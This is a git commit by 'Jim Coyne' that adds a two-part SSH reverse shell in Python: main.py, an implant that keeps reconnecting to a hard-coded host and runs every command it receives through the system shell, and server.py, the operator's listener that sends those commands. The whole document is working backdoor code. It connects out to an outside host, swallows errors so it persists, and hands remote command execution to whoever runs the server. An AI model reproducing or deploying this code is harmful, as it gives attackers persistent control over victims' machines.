8f7e332d0c7758b1862958b4a6bd56d1d9762954
Jim Coyne <jim.coyne@gmail.com>
2021-01-27 00:21:03 +0000

    Initial commit

---
+++ main.py
@@ -0,0 +1,56 @@
+import paramiko
+import subprocess
+import os
+
+
+HOST = '10.10.10.10'
+USERNAME = 'test'
+PASSWORD = 'test'
+PORT = 2022
+run = True
+
+while True:
+  if run == False:
+    break
+  else:
+    try:
+      client = paramiko.SSHClient()
+      client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+      client.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD, compress=True)
+      chan = client.get_transport().open_session()
+      chan.send('Command Shell Open')
+      while True:
+          command = chan.recv(1024).decode()
+          if command == 'exit':
+            run = False
+            client.close()
+            break
+          elif command == 'reset':
+            run = True
+            client.close()
+            break
+          else:
+            try:
+              process = subprocess.run(command, shell=True, capture_output=True, text=True)
+              if str(process.stderr).startswith("/bin/sh:"):
+                chan.send(str(process.stderr))
+                cmd = ''
+              elif str(process.stdout) == "" and str(process.stderr) == "":
+                chan.send('No data returned')
+                cmd = ''
+              elif str(process.stdout) == "":
+                chan.send(str(process.stderr))
+                cmd = str(process.stderr)
+              else:
+                cmd = str(process.stdout)
+                try:
+                  chan.send(cmd)
+                except Exception as e:
+                  chan.send(e)
+                  print(e)
+            except subprocess.CalledProcessError as e:
+                chan.send(e)
+                print(e)
+                client.close()
+    except:
+      pass
---
+++ server.py
@@ -0,0 +1,67 @@
+import socket
+import paramiko
+import threading
+import sys
+
+KEYNAME = 'id_rsa'
+HOST = '0.0.0.0'
+PORT = 2022
+USERNAME = 'test'
+PASSWORD = 'test'
+host_key = paramiko.RSAKey(filename=KEYNAME)
+
+
+class Server (paramiko.ServerInterface):
+   def _init_(self):
+       self.event = threading.Event()
+   def check_channel_request(self, kind, chanid):
+       if kind == 'session':
+           return paramiko.OPEN_SUCCEEDED
+       return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+   def check_auth_password(self, username, password):
+       if (username == USERNAME) and (password == PASSWORD):
+           return paramiko.AUTH_SUCCESSFUL
+       return paramiko.AUTH_FAILED
+
+while True:
+
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind((HOST, PORT))
+        sock.listen(100)
+        print('Listening for connection...')
+        client, addr = sock.accept()
+
+    except ValueError as e:
+        print('Listen/bind/accept failed: ' + str(e))
+        sys.exit(1)
+
+    try:
+        t = paramiko.Transport(client)
+        t.load_server_moduli()
+        t.add_server_key(host_key)
+        server = Server()
+        t.start_server(server=server)
+
+        chan = t.accept(20)
+        print(chan.recv(1024).decode())
+        while True:
+            command = input(">>").strip('\n')
+            if command == '':
+                print('no data to send')
+                pass
+            elif command == 'exit':
+                chan.send('exit')
+                break
+            elif command == 'reset':
+                chan.send('reset')
+                break
+            else:
+                chan.send(command)
+                print(chan.recv(1024).decode())
+
+    except Exception as e:
+        print('Caught exception: ' + str(e))
+        t.close()
+        pass
